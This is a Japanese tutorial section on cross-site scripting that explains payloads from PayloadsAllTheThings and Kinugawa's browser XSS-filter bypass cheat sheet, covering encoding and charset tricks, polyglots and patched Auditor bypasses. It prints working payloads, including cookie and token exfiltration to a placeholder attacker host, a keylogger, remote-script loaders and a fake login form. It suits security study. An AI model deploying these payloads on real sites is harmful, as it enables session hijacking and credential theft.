## ペイロード集とブラウザXSSフィルタ回避（Kinugawa）

前の節までで、XSS（クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）を「どういう発想で見つけ、どういう文脈で刺すか」という枠組みを学んできました。この節では、その枠組みに肉付けをする **二つの実戦資料** を精読して統合します。

1. **PayloadsAllTheThings の XSS Injection**（swisskyrepo）——世界最大級の攻撃ペイロード（攻撃に使う入力文字列）カタログ。「この文脈ではどう書くか」をコンテキスト（context＝ユーザー入力が最終的に置かれる場所と、そこでのブラウザの解釈規則）別に引くための辞書です。
2. **filterbypass**（Masato Kinugawa）——ブラウザに **組み込まれていた** XSS フィルタ（XSS Auditor / IE・Edge の XSS Filter）を回避するためのチートシート。「ブラウザ自身が防ごうとした XSS を、どうやってすり抜けたか」という、フィルタ回避の教科書的アーカイブです。

この二つを合わせて読むと、**「ペイロードは文脈で選び、フィルタは仕組みの隙間で抜く」** というこの節の核心が見えてきます。単なる文字列の暗記ではなく、**なぜその文字列がブラウザで実行に至るのか**——HTML パーサ（構文解析器）の状態遷移、文字コード（charset）の再解釈、名前空間（namespace）の切り替え——という「仕組み」まで掘り下げます。これがフィルタや WAF（Web Application Firewall＝Web アプリの手前で悪意ある通信を検知・遮断する仕組み）に勝つための本当の武器です。

---

### 資料1: PayloadsAllTheThings — ペイロードは「文脈」で引く辞書

PayloadsAllTheThings（略称 PTAT）は、XSS に限らずあらゆる Web 脆弱性のペイロードを集めた巨大リポジトリで、その XSS Injection セクションは「反射型（Reflected）」「保存型（Stored）」「DOM 型」の三分類から始まり、注入できる文脈ごとにペイロードを整理しています。この資料の正しい使い方は、**「まず自分の入力がどの文脈に落ちているかを特定し、その文脈の欄からペイロードを選ぶ」** ことです。同じ `alert(1)` を出すのでも、置かれる場所によって「動く書き方」がまったく違うからです。

> 出典: PayloadsAllTheThings — XSS Injection README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

まず三分類の定義を確認します。

- **反射型 XSS（Reflected）**: 攻撃コードを含む URL などを被害者がクリックした「その場」でコードが実行される型。攻撃者がメールで悪意ある JavaScript を仕込んだリンクを送り、クリック時にログイン情報を盗む、という典型例が挙げられています。サーバーには痕跡が残らず、被害者の一回のアクセスで完結します。
- **保存型 XSS（Stored）**: 攻撃コードがサーバー側（DB など）に**保存**され、そのページを開いた**すべての閲覧者**に対して実行される型。ブログのコメント欄に仕込むのが典型で、影響範囲が最も広い。
- **DOM 型 XSS（DOM-based）**: サーバーを一切介さず、ブラウザ内の JavaScript が DOM（Document Object Model＝ページを構成する要素のツリー構造）を操作する過程で発生する型。`innerHTML` や `location.href` への代入が典型的な sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先）になります。サーバーに攻撃コードの記録が残らないため、検出・防御が最も難しいとされます。

#### コンテキスト1: タグを丸ごと注入できる場合

入力が HTML の本文としてそのまま出力される（`<` `>` がエスケープされていない）最も恵まれた文脈です。この場合、自分で好きなタグを書けるので、**スクリプトを実行できる「入れ物」となるタグ**を選ぶだけです。

```html
<script>alert('XSS')</script>
```

なぜ動くか: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、`</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（script データ状態）に入るためです。出所が開発者か攻撃者かは問われません。ただし現代のフィルタは真っ先に `<script` を弾くので、実戦ではむしろ次の「イベントハンドラ経由」が本命になります。

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert(1)>
<svg/onload=alert('XSS')>
<body onload=alert(/XSS/.source)>
```

なぜ動くか: `<img src=x>` は「存在しない画像 x を読もうとして必ず失敗する」ため、失敗時に呼ばれる `onerror` イベントハンドラ（属性値に書いた JavaScript）が確実に発火します。`<svg onload>` や `<body onload>` は要素の読み込み完了時に発火します。**`<script>` を使わずに JavaScript を実行できる**のが要点で、`<script` を弾くフィルタを難なく越えます。`<svg/onload>` のように `/`（スラッシュ）でタグ名と属性を区切れるのは、HTML パーサが空白の代わりにスラッシュも属性の区切りとして許すためで、`svg onload` の間に空白を入れさせないフィルタを回避できます。

**ユーザー操作を必要としないベクトル**（画面表示だけで自動発火するもの）は特に価値が高い。PTAT は HTML5 タグを使った自動発火型を多数挙げています。

```html
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video src=_ onloadstart="alert(1)">
<video><source onerror="javascript:alert(1)">
<audio src onloadstart=alert(1)>
<details open ontoggle="alert`1`">
<marquee onstart=alert(1)>
```

なぜ動くか: `autofocus` 属性は「ページ表示時にこの要素へ自動でフォーカスを当てる」指示なので、`onfocus`（フォーカス取得時）と組み合わせると**ユーザーが何もしなくても**発火します。`<video>`/`<audio>` の `onloadstart` はメディア読み込み開始で、`<details open ontoggle>` は開いた状態で描画された瞬間に発火します。`alert`1`` はバッククォート（テンプレートリテラル）で関数を呼ぶ書き方で、`(` `)` を禁止するフィルタを越えます。

一方、**ユーザー操作を要するが、フィルタが警戒していない**珍しいイベントも収録されています。`onpointer*` 系（`onpointerover` `onpointerdown` `onpointerenter` `onpointermove` など）や、タッチ操作の `ontouchstart` / `ontouchend` / `ontouchmove` です。

```html
<div onpointerover="alert(45)">MOVE HERE</div>
<body ontouchstart=alert(1)>
```

なぜ収録されているか: `onmouseover` は有名で弾かれやすいが、`onpointerover`（マウス・タッチ・ペンを統一的に扱う新しいイベント）はブロックリスト（危険な文字列を列挙して弾く方式）に載っていないことが多い、という「フィルタの盲点」を突くためです。

さらにマニアックな2例:

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

なぜ動くか: 前者は `type="hidden"`（画面に見えない入力欄）でも `accesskey`（ショートカットキー）を割り当てられる挙動を利用し、被害者が `CTRL+SHIFT+X`（PTAT によると Firefox 130 以降・Chrome 108 以降で有効な組み合わせ）を押すと隠し要素の `onclick` が発火します。後者は `content-visibility:auto`（画面外の要素の描画を遅延する CSS 機能）の状態が切り替わったときに発火する新しいイベント `oncontentvisibilityautostatechange` を使い、スクロールで要素が視界に入った瞬間に発火させます。いずれも「新しいブラウザ機能はフィルタの更新より速く増える」ことの実例です。

#### コンテキスト2: 属性値の中に注入する場合

入力が `<input value="ここ">` のように既存タグの属性値に入る場合、まず**属性を閉じてタグを抜け出す**必要があります。

```html
"><script>alert('XSS')</script>
"\><img src=x onerror=alert('XSS')>
"\><svg/onload=alert(String.fromCharCode(88,83,83))>
```

なぜ動くか: 先頭の `">` は「開いている属性値（`"`）と開始タグ（`>`）を強制的に閉じる」働きで、これで自分は「タグの外」に出られ、続けて新しいタグを書けます。`"\>` のようにバックスラッシュを挟むのは、一部の不完全なエスケープ処理（`"` だけを見張っている実装）を惑わせるためのバリエーションです。

#### コンテキスト3: JavaScript の文字列リテラルの中に注入する場合

入力が `<script>var q="ここ";</script>` のように、すでに実行される JavaScript の文字列の中に入る場合、**HTML タグは不要**で、JavaScript の構文として抜け出します。

```javascript
";alert(1);//
'-alert(1)-'
-(confirm)(document.domain)//
```

なぜ動くか: `";` で開いている文字列と文の両方を閉じ、`alert(1);` を新しい文として実行し、`//` で残り（元の `";` など）をコメント化して構文エラーを防ぎます。`'-alert(1)-'` は文字列連結の式の中に関数呼び出しを紛れ込ませる技法で、引用符の種類が `'` の場合に使います。この文脈は後述する Kinugawa の資料でも「XSS フィルタが守らない代表的な領域」として登場する重要ポイントです。

#### コンテキスト4: URL 文脈（href / src）— `javascript:` と `data:`

入力が `<a href="ここ">` のようにリンク先やリソース先の URL として使われる場合、**危険なスキーム（プロトコル）**を使います。

```html
javascript:alert(1)
javascript:prompt(1)
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
```

なぜ動くか: `javascript:` スキームの URL は、リンクをたどった瞬間にその後ろの JavaScript が実行されます。`data:` スキームは「URL の中に文書の中身そのものを埋め込む」もので、`data:text/html,...` は新しい HTML 文書として解釈され、その中の `<script>` が動きます。`;base64,` を付ければ本文を Base64 でエンコードでき、`<` `>` を含まないので単純なフィルタを越えられます（例の Base64 は `<svg/onload=alert(2)>` を表します）。

#### エンコーディングによるフィルタ回避

`javascript:` や `alert` という文字列そのものを弾くフィルタに対しては、**「ブラウザは複数の表記を同じ文字として解釈する」** 性質を突きます。PTAT は多彩なエンコーディング回避を収録しています。

```html
<!-- 文字参照（HTML entity）: 10進・16進 -->
<img src=1 onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58...  <!-- javascript: -->

<!-- JavaScript内の16進・Unicode・8進エスケープ -->
<script>alert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)   <!-- javascript: -->
ja...:alert(1)
\152\141\166\141...072alert(1)   <!-- 8進数表現 -->

<!-- 文字コードから文字列を組み立てる -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- javascript: の途中に改行・タブを挟む -->
java%0ascript:alert(1)   <!-- %0a = LF（改行） -->
java%09script:alert(1)   <!-- %09 = 水平タブ -->
java%0dscript:alert(1)   <!-- %0d = CR -->
javascript://%0Aalert(1) <!-- // でコメント化してから改行で復帰 -->

<!-- 各文字をバックスラッシュでエスケープ（無害化されない） -->
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
```

なぜ動くか: `&#X61;` は文字参照で「a」を表し、ブラウザは属性値をパースする際にこれを実文字 `a` に復元してから解釈します。つまりフィルタが `alert` という並びを探しても、入力の見た目は `&#X61;&#X6C;...` なので一致しません。`a` `\x61` `\141`（8進）は JavaScript エンジンが「a」に解釈するエスケープで、`alert` は `alert` になります。`java%0ascript:` の `%0a`（改行）や `%09`（タブ）は、`javascript:` スキームの判定でブラウザがこれら制御文字を無視・除去するため、途中に挟んでも `javascript:` として成立し、`javascript:` という連続文字列を探すフィルタを裏切ります。**「フィルタが見る文字列」と「ブラウザが最終的に解釈する文字列」がズレる**——これがエンコーディング回避の統一原理で、この後の Kinugawa 資料でも文字コード（charset）レベルで同じ原理が繰り返し登場します。

#### 別フォーマットに潜む XSS（SVG・XML・Markdown・CSS）

XSS は HTML だけの話ではありません。ユーザーがアップロード・投稿できる各種フォーマットが sink になります。

**SVG ファイル**: SVG（ベクター画像形式）は実体が XML で、`<script>` を含められます。画像アップロード機能で SVG を受け付けていると、それを直接開いた被害者のブラウザで JavaScript が動きます。

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

なぜ動くか: SVG のルート要素に `onload` を書けば読み込み時に発火します。`<![CDATA[...]]>`（文字データ節＝中身を「ただの文字」として扱う XML の記法）と閉じタグを組み合わせるのは、`<desc>` や `<title>` の中身をエスケープするサニタイザ（sanitizer＝危険な要素・属性を除去する処理）の想定を、パーサの CDATA 処理でずらして `<script>` を「外」に出す技法です。PTAT は複数ベクトルを1ファイルに詰めた検証用 SVG（コードネーム red lightning、作者 noraj）も収録しており、`onload` 属性・`<desc>` 内 script・`<foreignObject>` 内 script・`<foreignObject>` 内 iframe(`src="javascript:..."`)・`<title>` 内 script・`<animateTransform onbegin>`・通常の `<script>` を一挙に試せます。

**XML**: 名前空間を明示すれば XHTML として script が動きます。

```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```

**Markdown**: リンク記法の URL 部分が sink になります。

```markdown
[a](javascript:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

なぜ動くか: Markdown を HTML に変換するライブラリが URL のスキームを検証していないと、`[表示文字](javascript:...)` が `<a href="javascript:...">` になります。`window.onerror=alert;throw 1` は「例外を投げると `onerror` が呼ばれ、その引数が `alert` に渡る」ことを使い、`alert(` という文字列を書かずに alert を発火させる技巧です。

**CSS**: `background-image: url("...")` の中に `</style>` を紛れ込ませて CSS 文脈を脱出します。

```html
<style>
div { background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>"); }
</style>
```

なぜ動くか: HTML パーサは `<style>` の中身を探索中に `</style>` を見つけると即座に style 要素を閉じます（CSS の構文よりタグ境界の判定が優先される）。よって URL 文字列の途中の `</style>` で CSS を強制終了させ、その後ろの `<svg onload>` を通常の HTML として実行させられます。これは後述する mXSS（変異型 XSS）とも通じる「パーサの状態遷移を悪用する」発想です。

#### リモートスクリプトと Blind XSS

長いペイロードを1行に収められない、あるいは攻撃コードを後から差し替えたい場合、外部スクリプトを読み込ませます。

```html
<script src=//attacker/a></script>
<script src=14.rs></script>            <!-- 14.rs/#alert(document.domain) で内容指定 -->
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
```

**Blind XSS（盲目的 XSS）** は、自分では結果を確認できない場所（管理画面のログ、サポートチケット、`Referer` や `User-Agent` を記録する解析画面など）で発火する XSS です。発火を「外部への通信」で検知します。

```html
"><script src=//[attacker.tld]></script>
<script>document.location='http://[attacker]/?c='+document.domain</script>
```

なぜ有効か: 攻撃者は入力欄に仕込むだけで結果を見られませんが、被害者（多くは管理者）が管理画面でその値を表示した瞬間に攻撃者サーバーへリクエストが飛ぶので、発火の有無と発火した画面のドメインが判ります。PTAT は自前ホスト型の XSS Hunter（`mandatoryprogrammer/xsshunter-express`）や `ssl/ezXSS`、`LewisArdern/bXSS` などの検知基盤も紹介しています。狙うべきエンドポイントとして、問い合わせフォーム、サポートチケット、`Referer`/`User-Agent` を記録する解析・管理パネル、コメント欄が挙げられています。

#### インパクト（影響）を示す PoC ペイロード

`alert(1)` はあくまで「実行できた」証拠であり、実害を示すには次のような PoC（Proof of Concept＝概念実証）に置き換えます。バグバウンティ（脆弱性報奨金）の報告では、こうした「実際に何が盗めるか」を示すと評価が上がります。

```html
<!-- Cookie / トークンの窃取 -->
<script>new Image().src="http://[attacker]/?c="+document.cookie;</script>
<script>new Image().src="http://[attacker]/?c="+localStorage.getItem('access_token');</script>

<!-- CORS を使ったデータ送信（no-cors で応答を読まず送信だけ行う） -->
<script>fetch('https://[attacker]',{method:'POST',mode:'no-cors',body:document.cookie});</script>

<!-- キーロガー（押されたキーを送信） -->
<img src=x onerror='document.onkeypress=function(e){fetch("http://[attacker]/?k="+String.fromCharCode(e.which))},this.remove();'>

<!-- 偽ログインフォームによる資格情報窃取（UI Redressing） -->
<script>
history.replaceState(null,null,'../../../login');
document.body.innerHTML="<h1>Please login to continue</h1><form>Username:<input type='text'>Password:<input type='password'><input value='submit' type='submit'></form>";
</script>
```

なぜ効くか: `document.cookie` にセッション ID が入っていれば（`HttpOnly` 属性が付いていない場合）、それを画像リクエストの URL に載せるだけで攻撃者サーバーに漏れます。`new Image().src=...` は目に見える変化を起こさず送信できるため気づかれにくい。UI Redressing の例は `history.replaceState` で URL バーの表示を `/login` に偽装しつつ、`document.body.innerHTML` をまるごと偽ログイン画面に差し替え、正規サイト上で資格情報を入力させます。

検証を効率化する小技も収録されています。保存型 XSS ではポップアップを何度も閉じるのが面倒なので `alert` の代わりに `console.log(...)` や `debugger;` を使う、`document.domain` と `window.origin` を同時に出して**どのオリジン（origin＝スキーム＋ホスト＋ポートの組。同一オリジンポリシーの単位）で発火したか**を一目で確認する、といった実務テクニックです。

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

#### ポリグロット（polyglot）— 文脈を選ばない万能ペイロード

ここまで見た通り、ペイロードは本来「文脈に合わせて選ぶ」ものです。しかし**注入先の文脈が事前に分からない**、あるいは**一発で複数箇所を試したい**ときに使うのがポリグロット（polyglot＝「多言語」の意。複数の文脈で同時に成立するように設計された一つの文字列）です。

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

なぜ「万能」か（0xsobky のポリグロットの分解）:
- `jaVasCript:` は大文字小文字を混ぜてある。ブラウザはスキーム名を**大小無視**で解釈するので `javascript:` として成立し、URL 文脈で発火する。同時に文字列としては `javascript` と一致しにくい。
- `/*...*/` は JavaScript でも CSS でもコメントとして働くので、JS 文脈・CSS 文脈のどちらに落ちても、前後の既存コードを壊さず「無害な繋ぎ」として機能する。
- `oNcliCk=alert()` は、もし属性文脈に落ちていれば有効なイベントハンドラ属性になる。
- `</stYle/</titLe/</teXtarEa/</scRipt/` は、`<style>` `<title>` `<textarea>` `<script>` という **「中身を生テキストとして扱う要素」の内部に落ちた場合に、それらを片端から閉じて脱出する**ための閉じタグ群。どれか一つに入っていても抜け出せる。
- 末尾の `\x3csVg/<sVg/oNloAd=alert()//>` は、脱出後に HTML 文脈で `<svg onload>` を発火させる本体（`\x3c` は `<`）。

つまり一本の文字列に「URL 文脈」「JS/CSS コメント」「属性文脈」「rawtext 要素からの脱出」「HTML タグ注入」を全部詰め込み、**どの文脈に落ちても最低一つの経路で発火する**ように作られています。PTAT は他に Rsnake、Ashar Javed、Mathias Karlsson、@s0md3v らの著名ポリグロットも収録しています。

```javascript
-->'"/></sCript><svG x=">" onload=(confirm)``>       <!-- @s0md3v -->
';alert(String.fromCharCode(88,83,83))//...--></SCRIPT>">'><SCRIPT>...  <!-- Rsnake -->
```

> 出典: PayloadsAllTheThings — XSS Polyglot — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md

---

### 資料2: Kinugawa filterbypass — ブラウザ組み込み XSS フィルタの回避

Masato Kinugawa（きぬがわまさと）氏の **filterbypass** は、「Browser's XSS Filter Bypass Cheat Sheet（ブラウザの XSS フィルタ回避チートシート）」というタイトルの GitHub リポジトリで、内容は主に Wiki に置かれています。Wiki は次の3ページ構成です。

- **Home**（目次）
- **Browser's XSS Filter Bypass Cheat Sheet**（当時まだ動いた回避手法の本体）
- **Fixed Bypass Archive**（すでにブラウザ側で修正された回避手法のアーカイブ）

> 出典: filterbypass（Masato Kinugawa） — https://github.com/masatokinugawa/filterbypass
> 出典: Browser's XSS Filter Bypass Cheat Sheet（Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

#### 前提: 「ブラウザ XSS フィルタ」とは何だったか（歴史的経緯）

まず重要な時代背景を押さえます。この資料が対象にしている **XSS Auditor（Chrome/Safari）** と **XSS Filter（IE/Edge）** は、かつてブラウザに組み込まれていた「反射型 XSS を検知して自動でブロックする機能」です。仕組みは大まかに、**「URL などのリクエストに含まれる文字列が、レスポンスの HTML 内でそのまま実行可能なスクリプトとして現れていたら、それを反射型 XSS とみなして無害化する」** というもの。いわば「入力と出力の一致」を見ていました。

しかしこの方式は多くの問題を抱えていました。第一に、**フィルタ自体が新たな脆弱性の温床**になった——フィルタが「XSS だ」と判断して HTML の一部を書き換えることで、かえって別の XSS（フィルタ誘発型の情報漏えいなど）を生む事例が知られます。第二に、後述するように**回避方法が無数にあり**、防御としての実効性が低かった。こうした理由から、**Chrome は 78（2019年後半）で XSS Auditor を完全に削除**し、Microsoft も Edge の Chromium 化に伴い XSS Filter を廃止しました。

したがって **filterbypass は現在では「歴史資料」** です。しかし本書で学ぶ価値は絶大です。なぜなら、ここで使われた回避テクニックの**原理**——文字コードの再解釈、パーサの状態遷移、同一オリジンリソースの悪用、名前空間の混乱——は、**現代の WAF 回避・サニタイザ回避・mXSS にそっくりそのまま応用が効く**からです。Kinugawa 氏自身、Wiki の末尾で「ここにバイパスが載っていなくても実際の悪用は可能であり、必ず根本的な XSS 対策（フィルタ頼みにしないこと）を行うべきだ」と強調しています。

#### そもそもフィルタが「守らない」領域

回避テクニックの前に、Kinugawa 氏はまず **「フィルタが最初から守っていない（=素通しする）文脈」** を列挙しています。ここに落ちる XSS は、そもそも回避を考えるまでもなく通ります。

XSS Auditor（Chrome/Safari）が守らない領域:
- **JavaScript 文字列リテラル内の XSS**: 例 `<script>var q="[ここに注入]";alert(1)//</script>`。入力がすでに `<script>` の中の文字列に入る場合、フィルタの「入力と出力の一致」検知が働きにくい。
- **URL 単独の XSS**: 例 `<a href="javascript:alert(1)">Link</a>`。
- **複数の注入ポイント**: ページ内の2箇所以上に別々に注入できる場合。フィルタは一つの連続したパターンを見るので、分割されると検知できない。
- **DOM 型 XSS**: `document.write()` 経由を除き、ほとんどの DOM 型はサーバーレスポンスに現れないため素通し。
- **XML ページの XSS**、**外部リクエストを送るだけのタグ**。

IE/Edge の XSS Filter が守らない領域:
- **すべての DOM 型 XSS**
- **複数注入ポイント**
- **文字列操作（削除・置換）を伴う場合**——アプリ側が入力中の特定文字を消したり置き換えたりすると、フィルタが見た反射パターンと実際の出力がズレて検知不能になる。

この「守らない領域リスト」自体が、防御側にとっては**「フィルタに頼れない典型ケース集」**として今も有益です。

#### XSS Auditor（Chrome/Safari）回避テクニック

以下は Wiki 本体（当時動作）と Fixed Bypass Archive（修正済み）から統合した主要手法です。修正済みのものは対象バージョンを併記します（陳腐化への注意——これらは**すでに塞がれています**が、原理の学習が目的です）。

**1. SVG アニメーションの `values` 属性を使う（Safari 系で有効だった）**

```html
<svg><animate xlink:href=#x attributeName=href values=&#x3000;javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

なぜ動いたか: SVG の `<animate>` は「別要素の属性を時間変化で書き換える」機能で、ここでは `<a id=x>` の `href` を `javascript:alert(1)` に書き換えます。フィルタは静的な HTML を見るので「`href=javascript:` が反射している」とは気づけません。先頭の `&#x3000;`（全角スペースの文字参照）は、`javascript:` の直前に無害な文字を置いてフィルタのパターン判定をずらす役割です。Chrome では PoC 1 が Chrome 59、`values=&#106;avascript:`（`&#106;` は `j` の文字参照）を使う PoC 2 が Chrome 62 で修正されました。

**2. 複数の null 文字（0x00）を前置する（Chrome、Chrome 62 で修正）**

```
[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
```

なぜ動いたか: フィルタが連続する null バイトを正しく処理できず、後続の `<script>` を見落とすバグを突いたものです。「任意タグを書ける」「null バイトが出力される」「直前に空白がない」の三条件で成立しました。

**3. 半端な（閉じきらない）script 閉じタグ（Chrome のみ、Chrome 61 で修正）**

```html
<div> <script>alert(1)</script </div><div id="x"></div>
```

なぜ動いたか: `</script`（`>` を欠く不完全な閉じタグ）の後ろに空白があると、フィルタは script の範囲を正しく切り出せず、しかしブラウザは後続の `<` までを script 終端として実行してしまう、というパーサ挙動の差を利用しました。

**4. script 内の `-->` によるコメント（Chrome、Chrome 62 で修正）**

```html
<div><script>alert(1)
--></div><script src=/test.js></script>
```

なぜ動いたか: HTML コメントの終端 `-->` を script 内に置くと、フィルタとブラウザで「どこまでが実行対象か」の解釈がズレ、フィルタの無害化を免れました。

**5. 半端な `<form>` による情報窃取（Chrome、Chrome 62 で修正）**

```html
<form action="form">
<input type="hidden" name="q" value=""></form><form action=https://attacker/">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

なぜ有効だったか: これは JavaScript を実行するのではなく、**ページ内に既存する秘密情報（隠しフォームの値）を攻撃者サーバーに送信させる**タイプ。注入した `<form action=https://attacker/>` が既存の秘密入力を「取り込んで」送信先を書き換えます。フィルタはスクリプト実行を見張るので、この手の情報漏えいは見逃しました。

**6. `<object>` + `<param name=url/code>` で Flash 実行（Chrome のみ、Chrome 64 で修正）**

```html
<object allowscriptaccess=always><param name=url value=https://l0.cm/xss.swf>
<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
```

なぜ動いたか: `<script>` を使わず `<object>`＋Flash（`.swf`）で JavaScript を呼ぶ経路。`allowscriptaccess=always` は SWF から親ページの JavaScript 呼び出しを許す設定で、`ExternalInterface.call()` に未エスケープ文字列が渡ると任意 JS が動きます。Flash が使える環境が前提でした（Flash 自体が 2020 年末に終了）。

**7. リンク＋半端な `<base>` タグ（Chrome、Chrome 65 で修正）**

```html
<div> <a href=//**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
```

なぜ動いたか: `<base href="javascript:...">` はページ内の相対リンクの基準 URL を書き換える要素で、これを不完全に置くことで相対 `href` が `javascript:` スキームに解決され、リンククリックで実行されました。

**8. 同一ドメインのリソースを悪用する（最重要の発想）**

XSS Auditor は「クエリを持たない**同一ドメイン**のリソースはスキップする（=信頼して検査しない）」という仕様の穴を持っていました。そこで、**攻撃コードを一度同一ドメインに置いてから読み込む**と検査を丸ごと回避できました。

```html
<!-- アップロード機能で置いた自前JSを読む -->
<script src=/bypass/usercontent/xss.js></script>

<!-- 同一ドメインに既にあるライブラリをテンプレートインジェクションに悪用 -->
<script src="/js/angular1.6.4.min.js"></script>
<p ng-app>{{constructor.constructor('alert(1)')()}}

<!-- jQuery を悪用した DOM Clobbering -->
<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
```

なぜ強力か: これは XSS Auditor 特有の話に見えて、実は**現代でも通用する普遍的発想**です。`{{constructor.constructor('alert(1)')()}}` は AngularJS のテンプレート式で、`constructor.constructor` を辿ると `Function` コンストラクタに到達し、そこから任意コードを生成・実行できます（AngularJS テンプレートインジェクション）。DOM Clobbering（DOMクロバリング＝`name`/`id` 属性で JavaScript から参照される変数を HTML 要素で「上書き」する技法。`<input name=ownerDocument>` が `node.ownerDocument` の参照を狂わせる）も同様に、フィルタではなくアプリ側 JS の前提を崩します。「同一オリジンにある正規の部品を武器に変える」——この発想は WAF・CSP 回避の章でも繰り返し現れます。

#### 文字コード（charset）を悪用する回避——回避の最深部

Kinugawa 資料の白眉は、**文字エンコーディング（charset）の混乱**を突く一連の手法です。原理はこうです。**フィルタはある文字コード（多くは UTF-8）を前提にバイト列を文字として解釈してパターン照合するのに対し、ブラウザが最終的にそのページをレンダリングするときの文字コードが別物だと、「同じバイト列が両者で違う文字列に見える」**。この不一致を作れば、フィルタには無害に、ブラウザには `<script>` に見せられます。

```html
<!-- ISO-2022-JP のエスケープシーケンスで反応文字列を分断 -->
<meta charset=iso-2022-jp>
<svg o[0x1B](Bnload=alert(1)>
```

なぜ動くか: `[0x1B](B`（ESC + `(B`）は ISO-2022-JP（日本語の文字コード）における「ここから ASCII に戻る」というエスケープシーケンスで、**表示上は消える（何も描かれない）バイト列**です。よってフィルタが見るバイト列には `o<ESC>(Bnload` という異物が挟まって `onload` と一致しないのに、ブラウザが ISO-2022-JP として解釈するとエスケープシーケンスが除去され `onload` が復活し、`<svg onload>` が発火します。charset が明示されていないページで有効でした。

IE/Edge XSS Filter に対しても同種の charset 回避が並びます。

```html
<!-- ナビゲーション時のエンコード不一致 -->
<meta charset=utf-8>
<script>
document.charset="x-chinese-cns";
location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)<\/script/旡"
</script>
```

なぜ動くか: `document.charset` を `x-chinese-cns`（中国語の文字コード）に変えてから遷移すると、URL 中の文字 `旡` は送信バイト列では `0xA13E` になります。フィルタは文字 `旡` として照合しますが、遷移先で `x-chinese-cns` として解釈すると別の文字境界で切れて `<script>` が現れます。**フィルタの解釈環境と実行環境の charset がズレる**という、charset 回避の核心を最も鮮明に示す例です。

```
+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

なぜ動くか: `+/v8-` は UTF-7 の BOM（Byte Order Mark＝文書の文字コードを示す先頭マーカー）として認識され、ページ全体が UTF-7 として再解釈されます。UTF-7 では `+ADw-` が `<`、`+AD4-` が `>` を表すので、`+ADw-script+AD4-` は `<script>` になります。フィルタが UTF-8 前提で「`<script>` は無い」と判断した後、ブラウザが UTF-7 に切り替えて `<script>` を出現させる、という時間差攻撃です（charset 未指定のページが前提）。

その他の IE/Edge 系回避:

```html
<!-- HZ-GB-2312 のエスケープで属性を分断 -->
<x~
onfocus=alert(1) id=a tabindex=0>#a

<!-- XML 名前空間の偽装（Edge） -->
<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>

<!-- @ を文字参照化して CSS import を通す -->
<svg><style>&commat;import'//attacker'</style></svg>
```

なぜ動くか: `~` は HZ-GB-2312 における改行エスケープとして働き、`onfocus` を属性値から分断してフィルタの照合を外します。`<embed/:script>` は `/:script` が「script タグらしさ」でフィルタを惑わせつつ、実体は embed として解釈される名前空間の混乱を突きます。`&commat;` は `@` の文字参照で、CSS の `@import`（外部スタイル読み込み）をフィルタに気づかせずに成立させ、外部リソースを読み込ませます（IE10 モードでは `behavior:url()` によるスクリプト実行にも繋がりました）。

**Referer を使った無効化**も収録されています。IE/Edge の XSS Filter は同一サイト内リンク経由でアクセスされた（＝`Referer` が同一サイトの）場合にフィルタを無効化する挙動があり、これを悪用します。

```html
<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>
```

Edge には `Referer` を偽装できるバグ（`window.open` と `opener` を操作するもの）もあり、2018年4月時点で修正が確認されています。

> 出典: Fixed Bypass Archive（Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive

#### charset 回避が今も重要な理由

XSS Auditor は消えましたが、**charset 混乱そのものは今も生きた攻撃面**です。`Content-Type` ヘッダで `charset` を明示していないページ、`<meta charset>` が本文より後ろにあるページ、ユーザー入力を含むレスポンスの文字コードが動的に変わるページでは、UTF-7 や ISO-2022-JP の再解釈による XSS が今も成立し得ます。防御は明快で、**すべてのレスポンスで `Content-Type: text/html; charset=utf-8` を明示し、`X-Content-Type-Options: nosniff` を付けてブラウザの charset 推測（sniffing）を止める**ことです。Kinugawa 資料の charset 章は、この防御がなぜ必要かを攻撃側から裏付ける最良の教材です。
